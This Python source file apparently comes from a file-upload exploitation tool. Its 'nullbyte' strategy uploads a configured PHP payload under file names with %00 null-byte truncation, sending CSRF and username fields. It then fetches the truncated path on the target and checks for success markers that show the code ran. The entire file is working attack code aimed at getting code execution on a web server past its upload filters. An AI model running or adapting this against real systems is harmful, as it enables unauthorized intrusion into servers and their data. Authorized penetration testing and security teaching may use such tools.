from .base import Strategy
from core.common import build_url, marker_result, nonempty_lines
from core.models import StrategyResult
class NullByteStrategy(Strategy):
    name = "nullbyte"
    def run(self, session, csrf, config, logger):
        logger.info("Technique 5: null-byte candidates")
        if not config.NULLBYTE_FILE.exists(): return StrategyResult(False, self.name, f"File not found: {config.NULLBYTE_FILE}")
        upload_url = build_url(config.TARGET, config.UPLOAD_URL)
        for candidate in nonempty_lines(config.NULLBYTE_FILE):
            logger.info(f"Trying: {candidate}")
            data = {config.UPLOAD_USER_FIELD: config.UPLOAD_USERNAME}
            if csrf: data[config.UPLOAD_CSRF_FIELD] = csrf
            files = {config.UPLOAD_FILE_FIELD: (candidate, config.PHP_PAYLOAD.encode(), config.NULLBYTE_CONTENT_TYPE)}
            try:
                r = session.post(upload_url, data=data, files=files, timeout=config.TIMEOUT, verify=config.VERIFY_TLS, allow_redirects=config.FOLLOW_REDIRECTS)
                logger.info(f"Upload response: HTTP {r.status_code}")
                if r.status_code >= 400: continue
                effective = candidate.split("%00", 1)[0]
                if not effective: continue
                verify_url = build_url(config.TARGET, config.NULLBYTE_VERIFY_BASE_URL.rstrip("/") + "/" + effective)
                v = session.get(verify_url, timeout=config.TIMEOUT, verify=config.VERIFY_TLS, allow_redirects=config.FOLLOW_REDIRECTS)
                result = marker_result(self.name, v, verify_url, config.SUCCESS_MARKER, config.END_MARKER, candidate)
                if result.success: return result
            except Exception as exc: logger.warn(f"Candidate error: {exc}")
        return StrategyResult(False, self.name, "All null-byte candidates exhausted.")
